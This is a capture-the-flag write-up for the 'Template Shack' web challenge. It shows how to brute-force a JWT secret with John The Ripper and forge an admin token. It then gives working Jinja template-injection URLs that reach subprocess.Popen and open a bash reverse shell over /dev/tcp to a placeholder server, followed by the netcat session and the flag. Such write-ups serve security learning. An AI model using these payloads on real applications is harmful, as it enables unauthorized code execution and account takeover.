# Template Shack

Author: [roerohan](https://github.com/roerohan)

# Requirements

- JWT
- John The Ripper

# Source

```
Check out the coolest web templates online!

Connect here:
http://jh2i.com:50023
```

# Exploitation

When you visit the website, you find that there's a cookie containing a JWT. It's hashed using `HS256`. We used `rockyou.txt` to bruteforce the JWT secret, using John The Ripper.

```
$ john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

The secret is `supersecret`. Using this, you can make a JWT with `username: admin`.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.Ykqid4LTnSPZtoFb11H-_2q-Vo32g4mLpkEcajK0H7I
```

Now, add this to your cookie. You are logged in as admin. Visit some random route starting with `/admin/` which throws a 404. You can see there's scope for template injection in the 404 page.

```
http://jh2i.com:50023/template/admin/%7B%7B().__class__.__bases__[0].__subclasses__()%7D%7D
```

You can climb up the Python MRO using the `__class__` and `__bases__`, etc. This way you can find a list of all the classes you can use. On index 405, you see `subprocess.Popen`.

```
http://jh2i.com:50023/template/admin/%7B%7B().__class__.__bases__[0].__subclasses__()[405]%7D%7D
```

This shows `/template/admin/<class 'subprocess.Popen'>` on the website.

Now, you can use this to spawn a reverse shell. 

```
http://jh2i.com:50023/template/admin/%7B%7B().__class__.__bases__[0].__subclasses__()[405](['bash -c %22bash -i %3E& /dev/tcp/yourserverip/yourport 0%3E&1%22'], shell=True)%7D%7D
```

> Note: Replace yourserverip and yourport.

Start a `netcat` listener on your server at the specified port. 

You get a shell!

```
$ nc -lp 8000
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
user@272108e56147:~$ ls
ls
flag.txt
main.py
posts.py
requirements.txt
templates
user@272108e56147:~$ cat flag.txt
cat flag.txt
flag{easy_jinja_SSTI_RCE}
```

The flag is:

```
flag{easy_jinja_SSTI_RCE}
```